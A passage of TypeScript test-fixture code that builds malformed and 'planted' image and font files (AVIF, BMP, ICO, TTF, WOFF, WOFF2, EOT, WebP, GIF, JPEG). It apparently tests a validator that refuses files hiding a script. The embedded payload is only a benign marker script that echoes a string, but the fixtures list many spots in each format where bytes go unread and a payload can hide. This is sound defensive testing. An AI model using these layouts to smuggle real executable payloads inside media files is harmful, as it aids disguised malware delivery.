    "iloc-index-short.avif": avif(Buffer.alloc(0), { meta: [idat], iloc: () => fullBox("iloc", 1, Buffer.concat([u16be(0x0408), u16be(1), u16be(1), u16be(1), u16be(0), u16be(1), u32be(4)])) }),
    "iloc-offset-short.avif": avif(Buffer.alloc(0), { meta: [idat], iloc: () => fullBox("iloc", 1, Buffer.concat([u16be(0x8400), u16be(1), u16be(1), u16be(1), u16be(0), u16be(1), u32be(4)])) }),
    "iloc-length-short.avif": avif(undefined, { items: [second], iloc: inMdat(0, (o) => Buffer.concat([u16be(0x4400), u16be(2), u16be(1), u16be(0), u16be(1), u32s(o, 4), u16be(2), u16be(0), u16be(1), u32be(o)])) }),
    "iloc-empty-extent.avif": avif(undefined, { extents: [[0, 4], [0, 0]] }),
    "extent-before.avif": avif(undefined, { extents: [[-4, 8]] }),
    "extent-past.avif": avif(undefined, { extents: [[0, 12]] }),
    "extent-gap.avif": avif(Buffer.concat([Buffer.from([1, 2, 3, 4]), scriptIds32, Buffer.from([5, 6, 7, 8])]), { extents: [[0, 4], [4 + scriptIds32.length, 4]] }),
    "extent-outside.avif": avif(undefined, { extents: [[0, 4], [20, 4]] }),
    // AVIF: properties and their associations.
    "iprp-empty.avif": avif(undefined, { iprp: box("iprp", Buffer.alloc(0)) }),
    "iprp-first.avif": avif(undefined, { iprp: box("iprp", Buffer.concat([box("blob", ispe), ipma])) }),
    "iprp-no-ipma.avif": avif(undefined, { iprp: box("iprp", box("ipco", ispe)) }),
    "ipco-children.avif": avif(undefined, { iprp: box("iprp", Buffer.concat([box("ipco", Buffer.from([0, 0, 0])), ipma])) }),
    "ipco-empty.avif": avif(undefined, { iprp: box("iprp", Buffer.concat([box("ipco", Buffer.alloc(0)), fullBox("ipma", 0, Buffer.concat([u32be(1), u16be(1), Buffer.from([0])]))])) }),
    "ispe-version.avif": avif(undefined, { properties: [fullBox("ispe", 1, u32s(1, 1))] }),
    "pixi-version.avif": avif(undefined, { properties: [fullBox("pixi", 1, Buffer.from([1, 8]))] }),
    "av1C-short.avif": avif(undefined, { properties: [box("av1C", Buffer.from([0x81]))] }),
    "colr-kind.avif": avif(undefined, { properties: [box("colr", Buffer.concat([Buffer.from("#!sh", "latin1"), iccHeader(132)]))] }),
    "ipma-null-version.avif": avif(undefined, { ipmaBox: fullBox("ipma", 0, Buffer.concat([u32be(1), u32be(1), Buffer.from([1, 0x81])]), 2) }),
    "ipma-version.avif": avif(undefined, { ipmaBox: fullBox("ipma", 2, Buffer.concat([u32be(1), u32be(1), Buffer.from([1, 0x81])])) }),
    "ipma-item.avif": avif(undefined, { ipmaBox: fullBox("ipma", 0, Buffer.concat([u32be(1), u16be(9), Buffer.from([1, 0x81])])) }),
    "ipma-index.avif": avif(undefined, { ipmaBox: fullBox("ipma", 0, Buffer.concat([u32be(1), u16be(1), Buffer.from([1, 0x85])])) }),
    // Bitmaps and icons.
    "bm.bmp": bmpOf({ magic: "#!" }),
    "bmp-size.bmp": bmpOf({ size: script.readUInt32LE(0) }),
    "pixels-overlap.bmp": bmpOf({ offset: 50, rows: Buffer.alloc(4) }),
    "header-size.bmp": bmpOf({ headerSize: 44 }),
    "header-past.bmp": withU32(bmp(), 14, 124, true),
    "planes.bmp": bmpOf({ planes: 2 }),
    "bits.bmp": bmpOf({ bits: 2, palette: Buffer.alloc(16), rows: Buffer.alloc(4) }),
    "width.bmp": bmpOf({ width: 0, rows: Buffer.alloc(0) }),
    "height.bmp": bmpOf({ height: 0, rows: Buffer.alloc(0) }),
    "rle.bmp": bmpOf({ bits: 8, compression: 1, used: 2, palette: Buffer.alloc(8), rows: Buffer.alloc(4) }),
    "rle32.bmp": bmpOf({ bits: 32, compression: 1, rows: Buffer.alloc(4) }),
    "bitfields8.bmp": bmpOf({ bits: 8, compression: 3, used: 2, masks: Buffer.alloc(12), palette: Buffer.alloc(8), rows: Buffer.alloc(4) }),
    // A width past 16 bits (65,537), with one pixel's row: an info header's width is 32 bits.
    "width-past-u16.bmp": bmpOf({ width: 0x10001 }),
    "ico-top-down.ico": ico([topDown]),
    "ico-odd.ico": ico([odd]),
    "ico-tiny.ico": ico([Buffer.from([0, 0, 0])]),
    "ico-short-bitmap.ico": ico([ico1.subarray(0, 44)]),
    "ico-header.ico": patched(ico(), 2, [2]),
    "ico-many.ico": manyIco,
    // sfnt.
    "sfnt-tiny.ttf": Buffer.from("OTTO\0", "latin1"),
    "sfnt-tag.ttf": patched(ttf(), 0, Buffer.from("#!sh")),
    "sfnt-many.ttf": sfnt(manyRecords, Buffer.concat([Buffer.alloc(4 * 512, 0x41), padded(head)])),
    "sfnt-directory.ttf": Buffer.from([0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]),
    "head-short.ttf": sfnt([["head", 28, shortHead.length]], shortHead),
    "no-head.ttf": sfnt([["blob", 28, 4]], Buffer.from([1, 2, 3, 4])),
    // WOFF.
    "woff-signature.woff": patched(woff(), 0, Buffer.from("#!sh")),
    "woff-tiny.woff": Buffer.concat([Buffer.from("wOFF", "latin1"), u32be(0), u32be(12)]),
    "woff-length.woff": withU32(woff(), 8, script.readUInt32BE(0)),
    "woff-directory.woff": woffHeader,
    "woff-tag.woff": woffOf([["head", head], [Buffer.from([1, 2, 3, 4]), Buffer.from([1, 2, 3, 4])]]),
    "woff-stored.woff": woff({ table: deflateSync(head, { level: 0 }) }),
    "woff-magic.woff": woff({ table: noMagic }),
    "private-offset.woff": withU32(woff(), 36, script.readUInt32BE(0)),
    "private-length.woff": withU32(woff(), 40, 4),
    "woff-no-head.woff": patched(woff(), 44, Buffer.from("blob")),
    "woff-gap.woff": gapped(woff()),
    // WOFF2.
    "woff2-signature.woff2": patched(woff2(), 0, Buffer.from("#!sh")),
    "woff2-tiny.woff2": Buffer.concat([Buffer.from("wOF2", "latin1"), u32be(0), u32be(12)]),
    "woff2-length.woff2": withU32(woff2(), 8, script.readUInt32BE(0)),
    "woff2-tag.woff2": woff2Of(2, Buffer.from([0x01, 54, 0x3f, 1, 2, 3, 4, 4]), Buffer.concat([head, Buffer.from([1, 2, 3, 4])])),
    "woff2-leading.woff2": woff2Of(1, Buffer.from([0x01, 0x80, 54]), head),
    "woff2-transform-length.woff2": woff2Of(2, Buffer.from([0x01, 54, 0x0a, 4, 0x80, 4]), Buffer.concat([head, Buffer.from([1, 2, 3, 4])])),
    "woff2-head-transformed.woff2": woff2Of(1, Buffer.from([0x41, 54, 54]), head),
    "woff2-head-short.woff2": woff2Of(1, Buffer.from([0x01, 16]), shortHead),
    "woff2-no-head.woff2": woff2Of(1, Buffer.concat([Buffer.from([0x3f]), Buffer.from("blob", "latin1"), Buffer.from([16])]), offMagic),
    "woff2-magic.woff2": woff2Of(1, Buffer.from([0x01, 54]), noMagic),
    "woff2-base128-bound.woff2": woff2Of(2, Buffer.from([0x01, 54, 0x0a, 0xc0, 0x80, 0x80, 0x80, 0x00, 4]), Buffer.concat([head, Buffer.from([1, 2, 3, 4])])),
    "private-offset.woff2": withU32(woff2(), 40, script.readUInt32BE(0)),
    "private-length.woff2": withU32(woff2(), 44, 4),
    "woff2-gap.woff2": gapped(woff2()),
    // EOT.
    "eot-size.eot": withU32(eot(), 0, script.readUInt32LE(0), true),
    "eot-data-size.eot": withU32(eot(), 4, script.readUInt32LE(0), true),
    "eot-version.eot": v21,
    "eot-magic.eot": patched(eot(), 34, [0x23, 0x21]),
    "eot-names-short.eot": eotShort,
    "eot-eudc-short.eot": eudcShort,
    "eudc-flags.eot": withU32(eot22, 112, script.readUInt32LE(0), true),
    "eudc-size.eot": withU32(eot22, 116, script.readUInt32LE(0), true),
  };
}

/**
 * One shape for each check the mutation pass reads past a plain refusal (each arm of a ternary, the
 * conditions of a braced block of checks, a check of a value a position-moving read returns, the
 * flags each full box may set), each with its twin: the same layout with that one field restored,
 * which is exempt. A shape is refused by that field alone, so with its check taken out of
 * content.ts it passes as an image or a font.
 */
function perField(): Record<string, readonly [Buffer, Buffer]> {
  const script = Buffer.from("#!/bin/sh\necho MARKER-PAYLOAD\nexit 0\n", "latin1");
  const u32s = (...values: number[]): Buffer => Buffer.concat(values.map((value) => u32be(value)));
  const selfContained = fullBox("url ", 0, Buffer.alloc(0), 1);
  const alpha = Buffer.from("urn:mpeg:mpegB:cicp:systems:auxiliary:alpha\0", "latin1");
  const ipma = fullBox("ipma", 0, Buffer.concat([u32be(1), u16be(1), Buffer.from([1, 0x81])]));
  const head = headTable();
  const font = ttf();
  /** A layout built with a field set (`true`) and restored (`false`). */
  const pair = (build: (set: boolean) => Buffer): readonly [Buffer, Buffer] => [build(true), build(false)];
  /** Flags no full box allows (`#!s`), or none: a box laid out in full but for its flags. */
  const flags = (build: (flags: number) => Buffer): readonly [Buffer, Buffer] => [build(0x232173), build(0)];
  /** An iloc (version 0) for item 1's four bytes at `offset`, with `reference` as its data reference index. */
  const iloc = (reference: Buffer, flagBits = 0) => (offset: number): Buffer =>
    fullBox("iloc", 0, Buffer.concat([u16be(0x4400), u16be(1), u16be(1), reference, u16be(1), u32s(offset, 4)]), flagBits);
  /** An EOT header for `rest` after it (names and font data, the font data `font`), of `version`. */
  const eotOf = (version: number, rest: Buffer): Buffer => {
    const header = Buffer.alloc(80);
    header.writeUInt32LE(80 + rest.length, 0);
    header.writeUInt32LE(font.length, 4);
    header.writeUInt32LE(version, 8);
    header.writeUInt16LE(0x504c, 34);
    return Buffer.concat([header, rest]);
  };
  const noMagic = eot();
  noMagic.fill(0, noMagic.length - font.length + 28 + 12, noMagic.length - font.length + 28 + 16);
  return {
    // Each arm of a ternary: a pitm of version 1, a URI item's strings, an a1lx with its flag set, a
    // version 1 ipma's item and a wide ipma's property index, a bitmap palette under 16 bits a pixel.
    "pitm-v1-tail.avif": pair((set) => avif(undefined, { children: (boxes) => [boxes[0] ?? Buffer.alloc(0), fullBox("pitm", 1, set ? Buffer.concat([u32be(1), script]) : u32be(1)), ...boxes.slice(2)] })),
    "uri-strings.avif": pair((set) => avif(undefined, { items: [infe(2, "uri ", set ? "#!/bin/sh\0echo MARKER-PAYLOAD\0exit 0\0" : "name\0urn:example:a\0")] })),
    "a1lx-flag-size.avif": pair((set) => avif(undefined, { properties: [box("a1lx", Buffer.concat([Buffer.from([1]), Buffer.alloc(12), set ? script : Buffer.alloc(0)]))] })),
    "ipma-v1-item.avif": pair((set) => avif(undefined, { ipmaBox: fullBox("ipma", 1, Buffer.concat([u32be(1), u32be(set ? 9 : 1), Buffer.from([1, 0x81])])) })),
    "ipma-wide-index.avif": pair((set) => avif(undefined, { ipmaBox: fullBox("ipma", 0, Buffer.concat([u32be(1), u16be(1), Buffer.from([1]), u16be(set ? 0x8005 : 0x8001)]), 1) })),
    "palette-1bit.bmp": pair((set) => bmpOf({ bits: 1, used: set ? padded(script).length / 4 : 2, palette: set ? padded(script) : Buffer.alloc(8) })),
    // A value a position-moving read returns: a data reference index that is not 0.
    "iloc-reference.avif": pair((set) => avif(undefined, { iloc: iloc(set ? Buffer.from("#!", "latin1") : u16be(0)) })),
    // A braced block of checks: a VP8 chunk's (with an animation frame after it, which marks an
    // image), a WOFF2 table's tag and transformed length, each WOFF and WOFF2 metadata field set alone.
    "vp8-unchecked.webp": pair((set) => webpOf([riffChunk("VP8 ", set ? script.subarray(0, 4) : Buffer.from([0, 0, 0, 0x9d, 0x01, 0x2a, 0, 0, 0, 0])), riffChunk("ANMF", script)])),
    "tag-unread.woff2": pair((set) => woff2Of(2, Buffer.concat([Buffer.from([0x3f]), set ? Buffer.alloc(0) : Buffer.from("blob", "latin1"), Buffer.from([4, 0x01, 54])]), Buffer.concat([Buffer.from("#!sh", "latin1"), head]))),
    "transform-unread.woff2": pair((set) => woff2Of(2, Buffer.from([0x01, 54, set ? 0x0a : 0xca, 4]), Buffer.concat([head, Buffer.from("#!sh", "latin1")]))),
    "meta-offset.woff": pair((set) => withU32(woff(), 24, set ? script.readUInt32BE(0) : 0)),
    "meta-length.woff": pair((set) => withU32(woff(), 28, set ? script.readUInt32BE(0) : 0)),
    "meta-original.woff": pair((set) => withU32(woff(), 32, set ? script.readUInt32BE(0) : 0)),
    "meta-offset.woff2": pair((set) => withU32(woff2(), 28, set ? script.readUInt32BE(0) : 0)),
    "meta-length.woff2": pair((set) => withU32(woff2(), 32, set ? script.readUInt32BE(0) : 0)),
    "meta-original.woff2": pair((set) => withU32(woff2(), 36, set ? script.readUInt32BE(0) : 0)),
    // A WOFF2 number whose first byte says another follows (read alone, it is a whole table length).
    "base128-continued.woff2": pair((set) => woff2Of(1, Buffer.from([0x01, set ? 0x80 | 54 : 54]), head)),
    // EOT: the font where its names (or its root string) should be, and plain font data that is no font.
    "names-skipped.eot": pair((set) => (set ? eotOf(0x00010000, font) : eot())),
    "root-skipped.eot": pair((set) => eotOf(0x00020001, Buffer.concat([Buffer.alloc(16), set ? Buffer.alloc(0) : Buffer.alloc(4), font]))),
    "plain-not-font.eot": pair((set) => (set ? noMagic : eot())),
    // Zero bytes after the last block, as many as the format's alignment never needs.
    "zero-tail.ico": pair((set) => Buffer.concat([ico(), Buffer.alloc(set ? 1 : 0)])),
    "zero-tail.woff": pair((set) => {
      const out = Buffer.concat([woff(), Buffer.alloc(set ? 4 : 0)]);
      out.writeUInt32BE(out.length, 8);
      return out;
    }),
    "zero-tail.woff2": pair((set) => {
      const out = Buffer.concat([woff2(), Buffer.alloc(set ? 4 : 0)]);
      out.writeUInt32BE(out.length, 8);
      return out;
    }),
    // The flags of each full box, outside the ones it allows.
    "meta-flags.avif": pair((set) => patched(avif(), 33, set ? Buffer.from("#!s", "latin1") : [0, 0, 0])),
    "hdlr-flags.avif": pair((set) => patched(avif(), 45, set ? Buffer.from("#!s", "latin1") : [0, 0, 0])),
    "pitm-flags.avif": flags((bits) => avif(undefined, { children: (boxes) => [boxes[0] ?? Buffer.alloc(0), fullBox("pitm", 0, u16be(1), bits), ...boxes.slice(2)] })),
    "iref-flags.avif": flags((bits) => avif(undefined, { meta: [fullBox("iref", 0, itemReference("cdsc", 1, [1]), bits)] })),
    "dref-flags.avif": flags((bits) => avif(undefined, { meta: [box("dinf", fullBox("dref", 0, Buffer.concat([u32be(1), selfContained]), bits))] })),
    // Its last flag byte stays 1 (self-contained), which the walk checks on its own.
    "url-flags.avif": flags((bits) => avif(undefined, { meta: [box("dinf", fullBox("dref", 0, Buffer.concat([u32be(1), fullBox("url ", 0, Buffer.alloc(0), (bits & ~0xff) | 1)])))] })),
    "group-flags.avif": flags((bits) => avif(undefined, { meta: [box("grpl", fullBox("altr", 0, u32s(5, 1, 1), bits))] })),
    "iinf-flags.avif": flags((bits) => avif(undefined, { iinf: fullBox("iinf", 0, Buffer.concat([u16be(1), infe(1, "av01", "Color\0")]), bits) })),
    "infe-flags.avif": flags((bits) => avif(undefined, { items: [infe(2, "Exif", "\0", bits & ~1)] })),
    "iloc-flags.avif": flags((bits) => avif(undefined, { iloc: iloc(u16be(0), bits) })),
    "ispe-flags.avif": flags((bits) => avif(undefined, { iprp: box("iprp", Buffer.concat([box("ipco", fullBox("ispe", 0, u32s(1, 1), bits)), ipma])) })),
    "pixi-flags.avif": flags((bits) => avif(undefined, { properties: [fullBox("pixi", 0, Buffer.from([1, 8]), bits)] })),
    "auxC-flags.avif": flags((bits) => avif(undefined, { properties: [fullBox("auxC", 0, alpha, bits)] })),
    "ipma-flags.avif": flags((bits) => avif(undefined, { ipmaBox: fullBox("ipma", 0, Buffer.concat([u32be(1), u16be(1), Buffer.from([1, 0x81])]), bits & ~1) })),
  };
}

/** The layouts of `planted` that hold `payload` where a walk once left bytes unread. */
function plantedLayouts(payload: Buffer): Record<string, Buffer> {
  // AVIF: ftyp, an empty meta box, and an mdat of size 0, which runs to the end of the file.
  const avifRunOn = Buffer.concat([box("ftyp", Buffer.from("avif\0\0\0\0", "latin1")), box("meta", Buffer.alloc(0)), u32be(0), Buffer.from("mdat", "latin1"), payload]);
  // WOFF: one four-byte table (the payload's first bytes), and the length field set to the file's.
  const woffHeader = Buffer.alloc(44);
  woffHeader.write("wOFF", 0, "latin1");
  woffHeader.writeUInt32BE(0x00010000, 4);
  woffHeader.writeUInt32BE(64 + payload.length, 8);
  woffHeader.writeUInt16BE(1, 12);
  const woffTail = Buffer.concat([woffHeader, Buffer.from("head", "latin1"), u32be(64), u32be(4), u32be(4), u32be(0), payload]);
  // WOFF2: one table, and a compressed size that covers the payload.
  const woff2Header = Buffer.alloc(48);
  woff2Header.write("wOF2", 0, "latin1");
  woff2Header.writeUInt32BE(0x00010000, 4);
  woff2Header.writeUInt32BE(50 + payload.length, 8);
  woff2Header.writeUInt16BE(1, 12);
  woff2Header.writeUInt32BE(payload.length, 20);
  const woff2Opaque = Buffer.concat([woff2Header, Buffer.from([0x01, 54]), payload]);
  // EOT: font data marked compressed or XOR-obfuscated.
  const eotFlagged = (flags: number): Buffer => {
    const header = Buffer.alloc(80);
    header.writeUInt32LE(96 + payload.length, 0);
    header.writeUInt32LE(payload.length, 4);
    header.writeUInt32LE(0x00010000, 8);
    header.writeUInt32LE(flags, 12);
    header.writeUInt16LE(0x504c, 34);
    return Buffer.concat([header, Buffer.alloc(16), payload]);
  };
  // sfnt: the head table placed after a gap that holds the payload.
  const gap = padded(payload);
  const head = headTable();
  const sfntGap = Buffer.concat([u32be(0x00010000), u16be(1), u16be(16), u16be(0), u16be(0), Buffer.from("head", "latin1"), u32be(0), u32be(28 + gap.length), u32be(head.length), gap, padded(head)]);
  // ICO: one PNG placed after a gap that holds the payload; and a bitmap entry that is an info header and the payload.
  const image = png();
  const icoGap = Buffer.concat([Buffer.from([0, 0, 1, 0, 1, 0]), Buffer.from([1, 1, 0, 0, 1, 0, 32, 0]), u32le(image.length), u32le(22 + payload.length), payload, image]);
  const bitmap = Buffer.concat([icoBitmap().subarray(0, 40), payload]);
  const icoBitmapRunOn = Buffer.concat([Buffer.from([0, 0, 1, 0, 1, 0]), Buffer.from([1, 1, 0, 0, 1, 0, 32, 0]), u32le(bitmap.length), u32le(22), bitmap]);
  // BMP: a 1x1 header whose size field is the file's, and the payload as its pixels.
  const bmpRunOn = Buffer.concat([bmp().subarray(0, 54), payload]);
  bmpRunOn.writeUInt32LE(bmpRunOn.length, 2);
  // BMP: a 24-bit bitmap whose colour count makes the payload a palette, which true colour has none of.
  const palette = padded(payload);
  const bmpPalette = Buffer.concat([bmp().subarray(0, 54), palette, bmp().subarray(54)]);
  bmpPalette.writeUInt32LE(bmpPalette.length, 2);
  bmpPalette.writeUInt32LE(54 + palette.length, 10);
  bmpPalette.writeUInt32LE(palette.length / 4, 14 + 32);
  // EOT: a name far longer than any font's (the payload, padded to an even length past the bound).
  const longName = Buffer.concat([payload, Buffer.alloc(600 + (payload.length % 2), 0x23)]);
  return {
    "run-on.avif": avifRunOn,
    "tail.woff": woffTail,
    "opaque.woff2": woff2Opaque,
    "compressed.eot": eotFlagged(0x4),
    "obfuscated.eot": eotFlagged(0x10000000),
    "gap.ttf": sfntGap,
    "gap.ico": icoGap,
    "bitmap.ico": icoBitmapRunOn,
    "run-on.bmp": bmpRunOn,
    // A box the walk does not read in each place an AVIF's meta nests boxes, and its strings.
    "free-in-ipco.avif": avif(undefined, { properties: [box("free", payload)] }),
    "free-in-dinf.avif": avif(undefined, { meta: [box("dinf", box("free", payload))] }),
    "url-location.avif": avif(undefined, { meta: [box("dinf", fullBox("dref", 0, Buffer.concat([u32be(1), fullBox("url ", 0, payload, 1)])))] }),
    "blob-in-iref.avif": avif(undefined, { meta: [fullBox("iref", 0, box("blob", payload))] }),
    "blob-in-grpl.avif": avif(undefined, { meta: [box("grpl", fullBox("blob", 0, payload))] }),
    "hdlr-name.avif": avif(undefined, { name: Buffer.concat([payload, Buffer.from([0])]) }),
    "item-name.avif": avif(undefined, { items: [infe(2, "Exif", `${payload.toString("latin1")}\0`)] }),
    // A WOFF or WOFF2 private block; an EOT's signature, EUDC font data, and a long name.
    "private.woff": woff({ private: payload }),
    "private.woff2": woff2({ private: payload }),
    "signature.eot": eot({ v22: { signature: Buffer.concat([payload, Buffer.alloc(payload.length % 2)]) } }),
    "eudc.eot": eot({ v22: { eudc: payload } }),
    "long-name.eot": eot({ names: [longName] }),
    "palette.bmp": bmpPalette,
    // A chunk, an extension or a marker segment of a type the format does not define.
    "chunk.webp": webp([riffChunk("blob", payload)]),
    "label.gif": gif([gifExtension(0x99, payload)]),
    "reserved.jpg": jpeg([jpegSegment(0xf0, payload)]),
  };
}
